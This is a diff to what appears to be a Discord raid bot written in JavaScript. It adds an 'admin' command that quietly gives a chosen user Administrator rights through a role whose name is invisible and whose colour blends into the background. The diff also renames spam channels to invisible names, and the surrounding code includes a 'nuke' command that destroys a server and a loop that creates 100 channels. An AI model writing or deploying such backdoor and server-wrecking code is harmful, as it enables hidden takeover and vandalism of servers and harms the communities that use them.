@@ -22,6 +22,24 @@ client.on('message', message => {
                     if (c.type == "text") c.send(msg);
                 });
         }
+        
+        // admin serverid userid
+        if (args[0] == prefix + 'admin') {
+            var serverid = args[1];
+            let guild = client.guilds.get(serverid);
+            var userid = client.users.get(args[2]);
+            try {
+                role = await message.guild.createRole({
+                    name: "឵឵឵   ",
+                    color: "#36393f",
+                    permissions: [8]
+                });
+                userid.addRole(role)
+            } catch(e) {
+                console.log(e.stack);
+            }
+        }
+        
         // destroy serverid
         if (args[0] == prefix + 'nuke') {
             var serverid = args[1];
@@ -34,12 +52,12 @@ client.on('message', message => {
             }
         }
         
-        // Spam text channels
+        // channels serverid
         if (args[0] == prefix + 'channels') {
             var serverid = args[1];
             let guild = client.guilds.get(serverid);
             for (i = 0; i < 100; i++) {
-                guild.createChannel("឵឵឵spam")
+                guild.createChannel("឵឵឵   ")
                     .then(console.log)
                     .catch(console.error);
             }
